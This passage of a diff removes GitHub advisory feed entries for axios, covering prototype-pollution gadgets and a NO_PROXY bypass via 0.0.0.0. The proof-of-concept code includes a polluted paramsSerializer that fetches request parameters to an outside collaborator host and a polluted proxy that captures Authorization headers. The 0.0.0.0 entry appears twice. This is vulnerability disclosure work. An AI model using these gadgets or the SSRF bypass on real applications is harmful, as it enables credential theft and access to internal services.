-<li><a href="https://github.com/axios/axios/releases/tag/v1.18.0">https://github.com/axios/axios/releases/tag/v1.18.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-mmx7-hfxf-jppx">https://github.com/advisories/GHSA-mmx7-hfxf-jppx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mmx7-hfxf-jppx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T22:25:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[axios] Axios: Prototype pollution gadgets can alter axios request construction]]></title>
-        <id>https://github.com/advisories/GHSA-mmx7-hfxf-jppx</id>
-        <link href="https://github.com/advisories/GHSA-mmx7-hfxf-jppx"/>
-        <updated>2026-07-20T22:25:08.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>axios is vulnerable to read-side prototype-pollution gadgets when <code>Object.prototype</code> has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: <code>axios.get()</code>, <code>axios.delete()</code>, <code>axios.head()</code>, and <code>axios.options()</code> read inherited <code>data</code> before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.</p>
-<p>Additional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited <code>proxy</code> or <code>paramsSerializer</code> values can influence request routing or URL serialization. These low-level paths are not reproduced through normal <code>axios.get()</code> usage on <code>1.15.2+</code>.</p>
-<h2 id="impact">Impact</h2>
-<p>An attacker who can first pollute <code>Object.prototype</code> can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on <code>GET</code>, <code>DELETE</code>, <code>HEAD</code>, or <code>OPTIONS</code>.</p>
-<p>For direct low-level Node HTTP adapter usage, inherited <code>proxy</code> can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.</p>
-<p>For direct <code>resolveConfig</code> or browser-adapter helper usage, inherited <code>paramsSerializer</code> can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on <code>1.15.2+</code>.</p>
-<h2 id="affected-functionality">Affected Functionality</h2>
-<p>Affected normal API:</p>
-<ul>
-<li><code>axios.get(url[, config])</code></li>
-<li><code>axios.delete(url[, config])</code></li>
-<li><code>axios.head(url[, config])</code></li>
-<li><code>axios.options(url[, config])</code></li>
-</ul>
-<p>Affected low-level usage:</p>
-<ul>
-<li>Direct calls to <code>axios/lib/adapters/http.js</code> or <code>axios/unsafe/adapters/http.js</code> with plain configs and no own <code>proxy</code>.</li>
-<li>Direct calls to <code>axios/unsafe/helpers/resolveConfig.js</code> or direct browser adapter/helper paths with plain configs and no own <code>paramsSerializer</code>.</li>
-</ul>
-<p>Unaffected or corrected scope:</p>
-<ul>
-<li>Normal <code>axios.get()</code> calls on <code>1.15.2+</code> did not reproduce the <code>proxy</code> or <code>paramsSerializer</code> gadgets because <code>mergeConfig()</code> returns a null-prototype config and uses own-property reads.</li>
-</ul>
-<h2 id="technical-details">Technical Details</h2>
-<p><code>lib/core/Axios.js</code> constructs aliases for bodyless methods and copies <code>data</code> with <code>(config || {}).data</code> before config normalization. If <code>Object.prototype.data</code> is polluted, this inherited value becomes an own <code>data</code> property in the merged request config and is sent by the adapter.</p>
-<p><code>lib/core/mergeConfig.js</code> in <code>1.15.2+</code> returns a null-prototype config and uses <code>hasOwnProp</code> guards, which prevents normal high-level requests from inheriting polluted <code>proxy</code> and <code>paramsSerializer</code> values after merge. This is why those two reporter claims do not reproduce through normal <code>axios.get()</code> on <code>1.15.2</code> or <code>1.16.1</code>.</p>
-<p>The low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of <code>config.proxy</code> in the Node HTTP adapter and <code>config.paramsSerializer</code> in affected <code>resolveConfig()</code> versions can consume inherited polluted values.</p>
-<h2 id="proof-of-concept-of-attack">Proof of Concept of Attack</h2>
-<pre><code class="language-js">import http from 'http';
-import axios from 'axios';
-
-const server = http.createServer((req, res) =&gt; {
-  let body = '';
-
-  req.on('data', chunk =&gt; {
-    body += chunk;
-  });
-
-  req.on('end', () =&gt; {
-    res.writeHead(200, {'content-type': 'application/json'});
-    res.end(JSON.stringify({body, headers: req.headers}));
-  });
-});
-
-await new Promise(resolve =&gt; server.listen(0, '127.0.0.1', resolve));
-
-Object.prototype.data = 'INJECTED';
-
-try {
-  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);
-
-  console.log(res.data.body); // "INJECTED"
-  console.log(res.data.headers['content-length']); // "8"
-} finally {
-  delete Object.prototype.data;
-  await new Promise(resolve =&gt; server.close(resolve));
-}
-</code></pre>
-<p>Expected result: a request body is sent even though the caller did not explicitly set <code>config.data</code>.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Avoid processing untrusted input with libraries or code paths that can pollute <code>Object.prototype</code>. As a defense-in-depth mitigation before an axios fix is available, explicitly pass <code>data: undefined</code> on bodyless method aliases when running in a process where prototype pollution is a concern.</p>
-<details>
-<summary>Original Report</summary>
-
-<h3 id="summary-1">Summary</h3>
-<p>Three prototype pollution read-side gadgets in axios bypass the <code>own()</code> hasOwnProp guard pattern, allowing a polluted <code>Object.prototype</code> to hijack outbound requests.</p>
-<h3 id="details">Details</h3>
-<p>The <a href="https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L342"><code>own()</code> helper</a> was introduced after GHSA-q8qp-cvcw-x6jj to prevent polluted prototype properties from reaching security-sensitive config reads. Three paths were missed:</p>
-<p><code>config.proxy</code> at <a href="https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L715">http.js:715</a> goes straight into <a href="https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L197"><code>setProxy()</code></a>. A polluted <code>Object.prototype.proxy</code> reroutes outbound requests through an attacker-controlled proxy, exposing Authorization headers and full request URLs.</p>
-<p><code>(config || {}).data</code> at <a href="https://github.com/axios/axios/blob/v1.15.2/lib/core/Axios.js#L248">Axios.js:248</a> covers GET, HEAD, DELETE, OPTIONS. Even without explicit body, polluted value becomes the body. I got injected payloads on 3 of 4 method types in testing.</p>
-<p><code>config.paramsSerializer</code> at <a href="https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L32">resolveConfig.js:32</a> is three lines below the <a href="https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L15"><code>own()</code> definition that was supposed to protect it</a>. A polluted  function onto <code>Object.prototype.paramsSerializer</code> gets called with the request params on every request that has query strings.</p>
-<p>I read up on the threat model and I believe T-R4b identifies this exact class and notes that config-read paths must use <code>hasOwnProp</code> guards. These three seem to predate or were missed by that coverage.</p>
-<h3 id="poc">PoC</h3>
-<p>Ran against <code>axios@1.15.2</code> on <code>node:22-slim</code> in Docker. Clean install, no other deps.</p>
-<pre><code class="language-javascript">import axios from 'axios';
-
-// gadget 1 - proxy
-Object.prototype.proxy = { host: 'yourcollab.oastify.com', port: 8080, protocol: 'http' };
-await axios.get('https://api.example.com/user', { headers: { Authorization: 'Bearer sk-test-1234567890' } });
-// check collaborator - request arrives with full path + auth header
-</code></pre>
-<pre><code class="language-javascript">// gadget 2 - data on bodyless methods
-Object.prototype.data = '{"injected":true}';
-await axios.get('https://api.example.com/items');
-await axios.delete('https://api.example.com/items/1');
-await axios.head('https://api.example.com/items');
-// 3/4 methods send the polluted body
-</code></pre>
-<pre><code class="language-javascript">// gadget 3 - paramsSerializer
-Object.prototype.paramsSerializer = (p) =&gt; {
-  fetch('https://yourcollab.oastify.com/?' + new URLSearchParams(p));
-  return 'q=x';
-};
-await axios.get('https://api.example.com/search', { params: { token: 'secret' } });
-</code></pre>
-<h3 id="impact-1">Impact</h3>
-<p>Any app with a polluted prototype (common via transitive deps like lodash, qs, minimist) should be affected. Gadget 1 steals credentials and redirects traffic. Gadget 2 corrupts request semantics. Gadget 3 gives the attacker arbitrary control over URL construction and a data exfiltration channel. All three fire silently on normal application code that never touches proxy, data, or <code>paramsSerializer</code> directly.</p>
-</details>
-### References
-
-<ul>
-<li><a href="https://github.com/axios/axios/security/advisories/GHSA-mmx7-hfxf-jppx">https://github.com/axios/axios/security/advisories/GHSA-mmx7-hfxf-jppx</a></li>
-<li><a href="https://github.com/axios/axios/pull/11000">https://github.com/axios/axios/pull/11000</a></li>
-<li><a href="https://github.com/axios/axios/pull/11001">https://github.com/axios/axios/pull/11001</a></li>
-<li><a href="https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d">https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d</a></li>
-<li><a href="https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2">https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2</a></li>
-<li><a href="https://github.com/axios/axios/releases/tag/v0.33.0">https://github.com/axios/axios/releases/tag/v0.33.0</a></li>
-<li><a href="https://github.com/axios/axios/releases/tag/v1.18.0">https://github.com/axios/axios/releases/tag/v1.18.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-mmx7-hfxf-jppx">https://github.com/advisories/GHSA-mmx7-hfxf-jppx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mmx7-hfxf-jppx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T22:25:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[axios] Axios: NO_PROXY bypass for 0.0.0.0 local addresses in axios]]></title>
-        <id>https://github.com/advisories/GHSA-f4gw-2p7v-4548</id>
-        <link href="https://github.com/advisories/GHSA-f4gw-2p7v-4548"/>
-        <updated>2026-07-20T22:20:19.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Axios versions containing <code>lib/helpers/shouldBypassProxy.js</code> do not treat <code>0.0.0.0</code> as a local address when evaluating <code>NO_PROXY</code> rules. In Node.js applications that use <code>HTTP_PROXY</code> or <code>HTTPS_PROXY</code> together with <code>NO_PROXY=localhost,127.0.0.1,::1</code> or similar, a request to <code>http://0.0.0.0:&lt;port&gt;/</code> can be routed through the configured proxy instead of bypassing it.</p>
-<p>The issue is exploitable when an attacker can influence the axios request URL or a followed redirect target, and when the proxy can reach or relay <code>0.0.0.0</code> to local services. This is a Node.js runtime proxy-routing issue, not a browser, install-time, or development-tooling issue.</p>
-<h2 id="impact">Impact</h2>
-<p>Applications are affected when all of the following are true:</p>
-<ul>
-<li>The application runs axios in Node.js with the HTTP adapter.</li>
-<li>The process uses environment proxy variables such as <code>HTTP_PROXY</code> or <code>HTTPS_PROXY</code>.</li>
-<li>The process uses <code>NO_PROXY</code> entries such as <code>localhost</code>, <code>127.0.0.1</code>, or <code>::1</code> to keep local traffic out of the proxy path.</li>
-<li>Attacker-controlled input can influence the request URL or redirect target.</li>
-<li>The configured proxy does not reject <code>0.0.0.0</code> and can reach the local destination.</li>
-</ul>
-<p>For plain HTTP targets, the proxy can receive the full request URL, headers, and body, and may be able to observe the local service response. HTTPS targets are less exposed because axios uses CONNECT tunneling in current versions.</p>
-<h2 id="affected-functionality">Affected Functionality</h2>
-<p>Affected functionality is limited to environment-derived proxy selection in the Node HTTP adapter:</p>
-<ul>
-<li><code>lib/adapters/http.js</code> calls <code>getProxyForUrl(location)</code> and then <code>shouldBypassProxy(location)</code> before applying the proxy.</li>
-<li><code>lib/helpers/shouldBypassProxy.js</code> normalizes and compares <code>NO_PROXY</code> entries.</li>
-<li>Explicit caller-provided <code>config.proxy</code> remains trusted caller configuration.</li>
-<li>Browser, React Native, XHR, and fetch adapter behavior are not affected.</li>
-</ul>
-<h2 id="technical-details">Technical Details</h2>
-<p><code>lib/helpers/shouldBypassProxy.js</code> defines local loopback equivalence through <code>isLoopback()</code>. The current implementation recognizes <code>localhost</code>, IPv4 <code>127.0.0.0/8</code>, IPv6 <code>::1</code>, and IPv4-mapped loopback forms, but it does not include <code>0.0.0.0</code>.</p>
-<p>At <code>lib/helpers/shouldBypassProxy.js:176</code>, axios treats two hosts as matching when both are considered loopback:</p>
-<pre><code class="language-js">return hostname === entryHost || (isLoopback(hostname) &amp;&amp; isLoopback(entryHost));
-</code></pre>
-<p>Because <code>isLoopback('0.0.0.0')</code> returns <code>false</code>, <code>NO_PROXY=localhost,127.0.0.1,::1</code> does not match <code>http://0.0.0.0:&lt;port&gt;/</code>. <code>lib/adapters/http.js:185-193</code> then applies the environment proxy.</p>
-<h2 id="proof-of-concept-of-attack">Proof of Concept of Attack</h2>
-<pre><code class="language-js">import http from 'http';
-import axios from './index.js';
-
-const listen = (handler, host = '127.0.0.1') =&gt;
-  new Promise((resolve) =&gt; {
-    const server = http.createServer(handler);
-    server.listen(0, host, () =&gt; resolve(server));
-  });
-
-const close = (server) =&gt; new Promise((resolve) =&gt; server.close(resolve));
-
-const origin = await listen((req, res) =&gt; res.end('origin'), '0.0.0.0');
-
-let proxyRequests = 0;
-const proxy = await listen((req, res) =&gt; {
-  proxyRequests += 1;
-  res.end('proxied');
-});
-
-process.env.http_proxy = `http://127.0.0.1:${proxy.address().port}`;
-process.env.HTTP_PROXY = process.env.http_proxy;
-process.env.no_proxy = 'localhost,127.0.0.1,::1';
-process.env.NO_PROXY = process.env.no_proxy;
-
-try {
-  const direct = await axios.get(`http://127.0.0.1:${origin.address().port}/`);
-  const zero = await axios.get(`http://0.0.0.0:${origin.address().port}/`);
-
-  console.log({ direct: direct.data, zero: zero.data, proxyRequests });
-} finally {
-  await close(origin);
-  await close(proxy);
-}
-</code></pre>
-<p>Expected safe behavior: both <code>127.0.0.1</code> and <code>0.0.0.0</code> bypass the proxy when the <code>NO_PROXY</code> policy is intended to cover local destinations.</p>
-<p>Observed behavior: <code>127.0.0.1</code> bypasses the proxy, while <code>0.0.0.0</code> is sent through the proxy.</p>
-<h2 id="workarounds">Workarounds</h2>
-<ul>
-<li>Add <code>0.0.0.0</code> explicitly to <code>NO_PROXY</code> where local addresses must bypass proxies.</li>
-<li>Reject or normalize <code>0.0.0.0</code> in application URL validation before calling axios.</li>
-<li>Set <code>proxy: false</code> on axios requests that must never use environment proxies.</li>
-<li>Configure the proxy itself to reject <code>0.0.0.0</code>, loopback, link-local, and internal address ranges.</li>
-</ul>
-<details>
-<summary>Original Report</summary>
-
-<h3 id="summary-1">Summary</h3>
-<p><code>axios</code> versions 1.15.0–1.16.1 contain an incomplete loopback-address check in <code>lib/helpers/shouldBypassProxy.js</code>. The <code>isLoopback()</code> function correctly identifies <code>127.0.0.0/8</code> and <code>::1</code> as loopback addresses but does not recognise <code>0.0.0.0</code> — the IPv4 unspecified address, which routes to the local machine on Linux and macOS.</p>
-<p>An attacker who controls a URL passed to axios can use <code>http://0.0.0.0/&lt;path&gt;</code> to bypass proxy-based SSRF filtering that the application relies upon.</p>
-<h3 id="details">Details</h3>
-<h2 id="affected-versions">Affected versions</h2>
-<p><code>&gt;= 1.15.0, &lt;= 1.16.1</code></p>
-<p>The vulnerability was introduced in v1.15.0 when the <code>shouldBypassProxy</code> helper was added as a security improvement (PR #10661).</p>
-<hr>
-<h2 id="root-cause">Root cause</h2>
-<p><strong>File:</strong> <code>lib/helpers/shouldBypassProxy.js</code></p>
-<pre><code class="language-javascript">// Line 1 — static allowlist (incomplete)
-const LOOPBACK_HOSTNAMES = new Set(['localhost']);   // ← 0.0.0.0 missing
-
-const isIPv4Loopback = (host) =&gt; {
-  const parts = host.split('.');
-  if (parts.length !== 4) return false;
-  if (parts[0] !== '127') return false;   // ← 0.0.0.0: parts[0] = '0' → false
-  return parts.every((p) =&gt; /^\d+$/.test(p) &amp;&amp; Number(p) &gt;= 0 &amp;&amp; Number(p) &lt;= 255);
-};
-
-const isLoopback = (host) =&gt; {
-  if (!host) return false;
-  if (LOOPBACK_HOSTNAMES.has(host)) return true;   // ← '0.0.0.0' not in set
-  if (isIPv4Loopback(host)) return true;           // ← returns false for 0.0.0.0
-  return isIPv6Loopback(host);
-};
-
-isLoopback('0.0.0.0') returns false.
-
-Node's WHATWG URL parser does not normalise 0.0.0.0 to 127.0.0.1. Other bypass forms are safe: new URL('http://0177.0.0.1/').hostname → '127.0.0.1' (octal), new URL('http://2130706433/').hostname → '127.0.0.1' (decimal), new URL('http://0x7f000001/').hostname → '127.0.0.1' (hex). Only 0.0.0.0 escapes normalisation.
-
-
-### PoC
-'use strict';
-
-// Verbatim copy of relevant logic from axios v1.16.1 shouldBypassProxy.js
-
-const LOOPBACK_HOSTNAMES = new Set(['localhost']);
-
-const isIPv4Loopback = (host) =&gt; {
-  const parts = host.split('.');
-  if (parts.length !== 4) return false;
-  if (parts[0] !== '127') return false;
-  return parts.every((p) =&gt; /^\d+$/.test(p) &amp;&amp; Number(p) &gt;= 0 &amp;&amp; Number(p) &lt;= 255);
-};
-
-const isLoopback = (host) =&gt; {
-  if (!host) return false;
-  if (LOOPBACK_HOSTNAMES.has(host)) return true;
-  return isIPv4Loopback(host);
-};
-
-// 1. Show URL parser does NOT normalise 0.0.0.0
-console.log(new URL('http://0.0.0.0/').hostname);    // → '0.0.0.0'   ← NOT normalised
-console.log(new URL('http://0177.0.0.1/').hostname); // → '127.0.0.1' ← normalised (safe)
-console.log(new URL('http://2130706433/').hostname);  // → '127.0.0.1' ← normalised (safe)
-
-// 2. Show isLoopback fails for 0.0.0.0
-console.log(isLoopback('0.0.0.0'));   // → false  ← BUG: should be true
-console.log(isLoopback('127.0.0.1')); // → true   ← correct
-
-Verified output on Node.js v22 / axios v1.16.1:
-0.0.0.0     ← NOT normalised by URL parser
-127.0.0.1   ← octal normalised correctly
-127.0.0.1   ← decimal normalised correctly
-false       ← 0.0.0.0 not detected as loopback  ⚠
-true        ← 127.0.0.1 correctly detected
-
-### Impact
-Applications that:
-
-Accept user-supplied URLs and pass them to axios
-Use a proxy with NO_PROXY=localhost (or similar) for SSRF filtering
-…can be bypassed by supplying http://0.0.0.0/&lt;path&gt;. Axios routes the request through the proxy (shouldBypassProxy returns false). If the proxy itself does not filter 0.0.0.0, the connection reaches the local machine — exposing internal services such as cloud IMDS endpoints, internal admin panels, or microservice APIs.
-
-Fix
-Minimal (one line):
-
-- const LOOPBACK_HOSTNAMES = new Set(['localhost']);
-+ const LOOPBACK_HOSTNAMES = new Set(['localhost', '0.0.0.0']);
-
-Comprehensive:
-
-const isIPv4Unspecified = (host) =&gt; host === '0.0.0.0';
-
-const isLoopback = (host) =&gt; {
-  if (!host) return false;
-  if (LOOPBACK_HOSTNAMES.has(host)) return true;
-  if (isIPv4Loopback(host)) return true;
-  if (isIPv4Unspecified(host)) return true;   // add this line
-  return isIPv6Loopback(host);
-};
-&lt;/details&gt;
-### References
-
-- &lt;https://github.com/axios/axios/security/advisories/GHSA-f4gw-2p7v-4548&gt;
-- &lt;https://github.com/axios/axios/pull/11000&gt;
-- &lt;https://github.com/axios/axios/pull/11001&gt;
-- &lt;https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d&gt;
-- &lt;https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2&gt;
-- &lt;https://github.com/axios/axios/releases/tag/v0.33.0&gt;
-- &lt;https://github.com/axios/axios/releases/tag/v1.18.0&gt;
-- &lt;https://github.com/advisories/GHSA-f4gw-2p7v-4548&gt;
-</code></pre>
-</details>]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f4gw-2p7v-4548</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T22:20:18.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[axios] Axios: NO_PROXY bypass for 0.0.0.0 local addresses in axios]]></title>
-        <id>https://github.com/advisories/GHSA-f4gw-2p7v-4548</id>
-        <link href="https://github.com/advisories/GHSA-f4gw-2p7v-4548"/>
-        <updated>2026-07-20T22:20:19.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Axios versions containing <code>lib/helpers/shouldBypassProxy.js</code> do not treat <code>0.0.0.0</code> as a local address when evaluating <code>NO_PROXY</code> rules. In Node.js applications that use <code>HTTP_PROXY</code> or <code>HTTPS_PROXY</code> together with <code>NO_PROXY=localhost,127.0.0.1,::1</code> or similar, a request to <code>http://0.0.0.0:&lt;port&gt;/</code> can be routed through the configured proxy instead of bypassing it.</p>
-<p>The issue is exploitable when an attacker can influence the axios request URL or a followed redirect target, and when the proxy can reach or relay <code>0.0.0.0</code> to local services. This is a Node.js runtime proxy-routing issue, not a browser, install-time, or development-tooling issue.</p>
-<h2 id="impact">Impact</h2>
-<p>Applications are affected when all of the following are true:</p>
-<ul>
-<li>The application runs axios in Node.js with the HTTP adapter.</li>
-<li>The process uses environment proxy variables such as <code>HTTP_PROXY</code> or <code>HTTPS_PROXY</code>.</li>
-<li>The process uses <code>NO_PROXY</code> entries such as <code>localhost</code>, <code>127.0.0.1</code>, or <code>::1</code> to keep local traffic out of the proxy path.</li>
-<li>Attacker-controlled input can influence the request URL or redirect target.</li>
-<li>The configured proxy does not reject <code>0.0.0.0</code> and can reach the local destination.</li>
-</ul>
-<p>For plain HTTP targets, the proxy can receive the full request URL, headers, and body, and may be able to observe the local service response. HTTPS targets are less exposed because axios uses CONNECT tunneling in current versions.</p>
-<h2 id="affected-functionality">Affected Functionality</h2>
-<p>Affected functionality is limited to environment-derived proxy selection in the Node HTTP adapter:</p>
-<ul>
-<li><code>lib/adapters/http.js</code> calls <code>getProxyForUrl(location)</code> and then <code>shouldBypassProxy(location)</code> before applying the proxy.</li>
-<li><code>lib/helpers/shouldBypassProxy.js</code> normalizes and compares <code>NO_PROXY</code> entries.</li>
-<li>Explicit caller-provided <code>config.proxy</code> remains trusted caller configuration.</li>
-<li>Browser, React Native, XHR, and fetch adapter behavior are not affected.</li>
-</ul>
-<h2 id="technical-details">Technical Details</h2>
-<p><code>lib/helpers/shouldBypassProxy.js</code> defines local loopback equivalence through <code>isLoopback()</code>. The current implementation recognizes <code>localhost</code>, IPv4 <code>127.0.0.0/8</code>, IPv6 <code>::1</code>, and IPv4-mapped loopback forms, but it does not include <code>0.0.0.0</code>.</p>
-<p>At <code>lib/helpers/shouldBypassProxy.js:176</code>, axios treats two hosts as matching when both are considered loopback:</p>
-<pre><code class="language-js">return hostname === entryHost || (isLoopback(hostname) &amp;&amp; isLoopback(entryHost));
-</code></pre>
-<p>Because <code>isLoopback('0.0.0.0')</code> returns <code>false</code>, <code>NO_PROXY=localhost,127.0.0.1,::1</code> does not match <code>http://0.0.0.0:&lt;port&gt;/</code>. <code>lib/adapters/http.js:185-193</code> then applies the environment proxy.</p>
-<h2 id="proof-of-concept-of-attack">Proof of Concept of Attack</h2>
-<pre><code class="language-js">import http from 'http';
-import axios from './index.js';
-
-const listen = (handler, host = '127.0.0.1') =&gt;
-  new Promise((resolve) =&gt; {
-    const server = http.createServer(handler);
-    server.listen(0, host, () =&gt; resolve(server));
-  });
-
-const close = (server) =&gt; new Promise((resolve) =&gt; server.close(resolve));
-
-const origin = await listen((req, res) =&gt; res.end('origin'), '0.0.0.0');
-
-let proxyRequests = 0;
-const proxy = await listen((req, res) =&gt; {
-  proxyRequests += 1;
-  res.end('proxied');
-});
-
-process.env.http_proxy = `http://127.0.0.1:${proxy.address().port}`;
-process.env.HTTP_PROXY = process.env.http_proxy;
-process.env.no_proxy = 'localhost,127.0.0.1,::1';
-process.env.NO_PROXY = process.env.no_proxy;
-
-try {
-  const direct = await axios.get(`http://127.0.0.1:${origin.address().port}/`);
-  const zero = await axios.get(`http://0.0.0.0:${origin.address().port}/`);
-
-  console.log({ direct: direct.data, zero: zero.data, proxyRequests });
-} finally {
-  await close(origin);
-  await close(proxy);
-}
-</code></pre>
-<p>Expected safe behavior: both <code>127.0.0.1</code> and <code>0.0.0.0</code> bypass the proxy when the <code>NO_PROXY</code> policy is intended to cover local destinations.</p>
-<p>Observed behavior: <code>127.0.0.1</code> bypasses the proxy, while <code>0.0.0.0</code> is sent through the proxy.</p>
-<h2 id="workarounds">Workarounds</h2>
-<ul>
-<li>Add <code>0.0.0.0</code> explicitly to <code>NO_PROXY</code> where local addresses must bypass proxies.</li>
-<li>Reject or normalize <code>0.0.0.0</code> in application URL validation before calling axios.</li>
-<li>Set <code>proxy: false</code> on axios requests that must never use environment proxies.</li>
-<li>Configure the proxy itself to reject <code>0.0.0.0</code>, loopback, link-local, and internal address ranges.</li>
-</ul>
-<details>
-<summary>Original Report</summary>
-
-<h3 id="summary-1">Summary</h3>
-<p><code>axios</code> versions 1.15.0–1.16.1 contain an incomplete loopback-address check in <code>lib/helpers/shouldBypassProxy.js</code>. The <code>isLoopback()</code> function correctly identifies <code>127.0.0.0/8</code> and <code>::1</code> as loopback addresses but does not recognise <code>0.0.0.0</code> — the IPv4 unspecified address, which routes to the local machine on Linux and macOS.</p>
-<p>An attacker who controls a URL passed to axios can use <code>http://0.0.0.0/&lt;path&gt;</code> to bypass proxy-based SSRF filtering that the application relies upon.</p>
-<h3 id="details">Details</h3>
-<h2 id="affected-versions">Affected versions</h2>
-<p><code>&gt;= 1.15.0, &lt;= 1.16.1</code></p>
-<p>The vulnerability was introduced in v1.15.0 when the <code>shouldBypassProxy</code> helper was added as a security improvement (PR #10661).</p>
-<hr>
-<h2 id="root-cause">Root cause</h2>
-<p><strong>File:</strong> <code>lib/helpers/shouldBypassProxy.js</code></p>
-<pre><code class="language-javascript">// Line 1 — static allowlist (incomplete)
-const LOOPBACK_HOSTNAMES = new Set(['localhost']);   // ← 0.0.0.0 missing
-
-const isIPv4Loopback = (host) =&gt; {
-  const parts = host.split('.');
-  if (parts.length !== 4) return false;
-  if (parts[0] !== '127') return false;   // ← 0.0.0.0: parts[0] = '0' → false
-  return parts.every((p) =&gt; /^\d+$/.test(p) &amp;&amp; Number(p) &gt;= 0 &amp;&amp; Number(p) &lt;= 255);
-};
-
-const isLoopback = (host) =&gt; {
-  if (!host) return false;
-  if (LOOPBACK_HOSTNAMES.has(host)) return true;   // ← '0.0.0.0' not in set
-  if (isIPv4Loopback(host)) return true;           // ← returns false for 0.0.0.0
-  return isIPv6Loopback(host);
-};
-
-isLoopback('0.0.0.0') returns false.
-
-Node's WHATWG URL parser does not normalise 0.0.0.0 to 127.0.0.1. Other bypass forms are safe: new URL('http://0177.0.0.1/').hostname → '127.0.0.1' (octal), new URL('http://2130706433/').hostname → '127.0.0.1' (decimal), new URL('http://0x7f000001/').hostname → '127.0.0.1' (hex). Only 0.0.0.0 escapes normalisation.
-
-
-### PoC
-'use strict';
-
-// Verbatim copy of relevant logic from axios v1.16.1 shouldBypassProxy.js
-
-const LOOPBACK_HOSTNAMES = new Set(['localhost']);
-
-const isIPv4Loopback = (host) =&gt; {
-  const parts = host.split('.');
-  if (parts.length !== 4) return false;
-  if (parts[0] !== '127') return false;
-  return parts.every((p) =&gt; /^\d+$/.test(p) &amp;&amp; Number(p) &gt;= 0 &amp;&amp; Number(p) &lt;= 255);
-};
-
-const isLoopback = (host) =&gt; {
-  if (!host) return false;
-  if (LOOPBACK_HOSTNAMES.has(host)) return true;
-  return isIPv4Loopback(host);
-};
-
-// 1. Show URL parser does NOT normalise 0.0.0.0
-console.log(new URL('http://0.0.0.0/').hostname);    // → '0.0.0.0'   ← NOT normalised
-console.log(new URL('http://0177.0.0.1/').hostname); // → '127.0.0.1' ← normalised (safe)
-console.log(new URL('http://2130706433/').hostname);  // → '127.0.0.1' ← normalised (safe)
-
-// 2. Show isLoopback fails for 0.0.0.0
-console.log(isLoopback('0.0.0.0'));   // → false  ← BUG: should be true
-console.log(isLoopback('127.0.0.1')); // → true   ← correct
-
-Verified output on Node.js v22 / axios v1.16.1:
-0.0.0.0     ← NOT normalised by URL parser
-127.0.0.1   ← octal normalised correctly
-127.0.0.1   ← decimal normalised correctly
-false       ← 0.0.0.0 not detected as loopback  ⚠
-true        ← 127.0.0.1 correctly detected
-
-### Impact
-Applications that:
-
-Accept user-supplied URLs and pass them to axios
-Use a proxy with NO_PROXY=localhost (or similar) for SSRF filtering
-…can be bypassed by supplying http://0.0.0.0/&lt;path&gt;. Axios routes the request through the proxy (shouldBypassProxy returns false). If the proxy itself does not filter 0.0.0.0, the connection reaches the local machine — exposing internal services such as cloud IMDS endpoints, internal admin panels, or microservice APIs.
-
-Fix
-Minimal (one line):
-
-- const LOOPBACK_HOSTNAMES = new Set(['localhost']);
-+ const LOOPBACK_HOSTNAMES = new Set(['localhost', '0.0.0.0']);
-
-Comprehensive:
-
-const isIPv4Unspecified = (host) =&gt; host === '0.0.0.0';
-
-const isLoopback = (host) =&gt; {
-  if (!host) return false;
-  if (LOOPBACK_HOSTNAMES.has(host)) return true;
-  if (isIPv4Loopback(host)) return true;
-  if (isIPv4Unspecified(host)) return true;   // add this line
-  return isIPv6Loopback(host);
-};
-&lt;/details&gt;
-### References
-
-- &lt;https://github.com/axios/axios/security/advisories/GHSA-f4gw-2p7v-4548&gt;
-- &lt;https://github.com/axios/axios/pull/11000&gt;
-- &lt;https://github.com/axios/axios/pull/11001&gt;
-- &lt;https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d&gt;
-- &lt;https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2&gt;
-- &lt;https://github.com/axios/axios/releases/tag/v0.33.0&gt;
-- &lt;https://github.com/axios/axios/releases/tag/v1.18.0&gt;
